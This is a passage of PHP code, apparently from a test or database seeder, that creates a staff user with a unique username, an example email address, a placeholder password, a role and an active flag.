            'username' => 'staff-'.uniqid(),
            'email' => uniqid().'@example.com',
            'password' => 'secret-password',
            'role_id' => $role->id,
            'is_active' => true,
        ]);
    }
}
